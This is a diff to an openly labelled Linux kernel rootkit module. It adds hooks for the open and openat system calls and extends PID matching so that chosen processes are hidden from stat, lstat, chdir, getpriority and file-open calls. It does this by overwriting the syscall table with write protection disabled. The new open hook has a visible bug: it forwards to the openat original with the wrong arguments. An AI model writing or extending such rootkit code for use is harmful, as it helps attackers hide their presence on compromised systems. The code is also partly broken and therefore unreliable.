@@ -86,6 +86,8 @@ hook_define(2, long, stat, const char __user*, pathname, struct __old_kernel_sta
 hook_define(2, long, lstat, const char __user*, pathname, struct __old_kernel_stat __user*, statbuf);
 hook_define(1, long, chdir, const char __user*, pathname);
 hook_define(2, long, getpriority, int, which, int, who);
+hook_define(3, long, open, const char __user*, pathname, int, flags, umode_t, mode);
+hook_define(4, long, openat, int, dfd, const char __user*, pathname, int, flags, umode_t, mode);
 
 asmlinkage long sys_getdents_do_hook(unsigned int fd, struct linux_dirent __user* dirent, unsigned int count, const struct pt_regs* regs) {
 	int buff_offset, deleted_size;
@@ -211,14 +213,16 @@ const char* my_basename(const char __user* pathname){
 	return last_barra+1;*/
 }
 
-int check_pids_in_pathname(const char __user *pathname, const char* syscall_caller){
+int check_pid_in_pathname(const char __user *pathname, const char* syscall_caller){
 	struct list_pids_node* node;
 	char pid_str[8];
+	char pid_str2[9];
 	const char* filename;
 	list_for_each_entry(node, &list_pids, list){
 		snprintf(pid_str, sizeof(pid_str), "%d", node->pid);
+		snprintf(pid_str2, sizeof(pid_str2), "%d/", node->pid);
 		filename = my_basename(pathname);
-		if (strcmp(pid_str, filename) == 0){
+		if (strcmp(pid_str, filename) == 0 || strstr(pathname, pid_str2) != NULL){
 			kfree(filename);
 			printk(KERN_INFO "ROOTKIT: Hidden process %s from call to %s\n", pid_str, syscall_caller);
 			return -1;
@@ -228,33 +232,46 @@ int check_pids_in_pathname(const char __user *pathname, const char* syscall_call
 	return 0;
 }
 
+int check_pid(int pid, const char* syscall_caller){
+	struct list_pids_node* node;
+	list_for_each_entry(node, &list_pids, list){
+		if (node->pid == pid){
+			printk(KERN_INFO "ROOTKIT: Hidden process %d from call to %s\n", pid, syscall_caller);
+			return -1;
+		}
+	}
+	return 0;
+}
+
 asmlinkage long sys_stat_do_hook(const char __user *pathname, struct __old_kernel_stat __user *statbuf, const struct pt_regs* regs){
-	if (check_pids_in_pathname(pathname, "stat") == -1) return -ENOENT;
+	if (check_pid_in_pathname(pathname, "stat") == -1) return -ENOENT;
 	return sys_stat_orig(ARGS_ORIG(2, const char __user *, pathname, struct __old_kernel_stat __user*, statbuf));
 }
 
 asmlinkage long sys_lstat_do_hook(const char __user *pathname, struct __old_kernel_stat __user *statbuf, const struct pt_regs* regs){
 	//printk(KERN_INFO "ROOTKIT: hello from stat\n");
-	if (check_pids_in_pathname(pathname, "lstat") == -1) return -ENOENT;
+	if (check_pid_in_pathname(pathname, "lstat") == -1) return -ENOENT;
 	return sys_lstat_orig(ARGS_ORIG(2, const char __user *, pathname, struct __old_kernel_stat __user*, statbuf));
 }
 
 asmlinkage long sys_chdir_do_hook(const char __user *pathname, const struct pt_regs* regs){
-	if (check_pids_in_pathname(pathname, "chdir") == -1) return -ENOENT;
+	if (check_pid_in_pathname(pathname, "chdir") == -1) return -ENOENT;
 	return sys_chdir_orig(ARGS_ORIG(1, const char __user*, pathname));
 }
 
 asmlinkage long sys_getpriority_do_hook(int which, int who, const struct pt_regs* regs){
-	struct list_pids_node* node;
-	if (which == PRIO_PROCESS){
-		list_for_each_entry(node, &list_pids, list){
-			if (node->pid == who){
-				printk(KERN_INFO "ROOTKIT: Hidden process %d from call to getpriority\n", who);
-				return -ENOENT;
-			}
-		}
-	}
+	if (which == PRIO_PROCESS && check_pid(who, "getpriority") == -1) return -ENOENT;
 	return sys_getpriority_orig(ARGS_ORIG(2, int, which, int, who));
+}
+
+asmlinkage long sys_open_do_hook(const char __user *pathname, int flags, umode_t mode, const struct pt_regs* regs){
+	if (check_pid_in_pathname(pathname, "open") == -1) return -ENOENT;
+	return sys_openat_orig(ARGS_ORIG(3, const char __user*, pathname, int, flags, umode_t, mode));
+}
+
+asmlinkage long sys_openat_do_hook(int dfd, const char __user *pathname, int flags, umode_t mode, const struct pt_regs* regs){
+	if (check_pid_in_pathname(pathname, "openat") == -1) return -ENOENT;
+	return sys_openat_orig(ARGS_ORIG(4, int, dfd, const char __user*, pathname, int, flags, umode_t, mode));
 }
 
 //__init para que solo lo haga una vez y después pueda sacarlo de memoria
@@ -272,14 +289,18 @@ int __init hooks_init(void){
 	sys_lstat_orig = (void*)syscall_table[__NR_lstat];
 	sys_chdir_orig = (void*)syscall_table[__NR_chdir];
 	sys_getpriority_orig = (void*)syscall_table[__NR_getpriority];
+	sys_open_orig = (void*)syscall_table[__NR_open];
+	sys_openat_orig = (void*)syscall_table[__NR_openat];
 
-	ENABLE_WRITE();
+	ENABLE_WRITE(); //there must be a way to do this better
 	if (HOOK_GETDENTS) syscall_table[__NR_getdents] = sys_getdents_hook;
 	if (HOOK_GETDENTS64) syscall_table[__NR_getdents64] = sys_getdents64_hook;
 	if (HOOK_STAT) syscall_table[__NR_stat] = sys_stat_hook;
 	if (HOOK_LSTAT) syscall_table[__NR_lstat] = sys_lstat_hook;
 	if (HOOK_CHDIR) syscall_table[__NR_chdir] = sys_chdir_hook;
 	if (HOOK_GETPRIORITY) syscall_table[__NR_getpriority] = sys_getpriority_hook;
+	if (HOOK_OPEN) syscall_table[__NR_open] = sys_open_hook;
+	if (HOOK_OPENAT) syscall_table[__NR_openat] = sys_openat_hook;
 	DISABLE_WRITE();
 
 	printk(KERN_INFO "ROOTKIT: Finished hooks\n");
@@ -295,6 +316,8 @@ void __exit hooks_exit(void){
 	if (HOOK_LSTAT) syscall_table[__NR_lstat] = sys_lstat_orig;
 	if (HOOK_CHDIR) syscall_table[__NR_chdir] = sys_chdir_orig;
 	if (HOOK_GETPRIORITY) syscall_table[__NR_getpriority] = sys_getpriority_orig;
+	if (HOOK_OPEN) syscall_table[__NR_open] = sys_open_orig;
+	if (HOOK_OPENAT) syscall_table[__NR_openat] = sys_openat_orig;
 	DISABLE_WRITE();
 
 	// delete lists
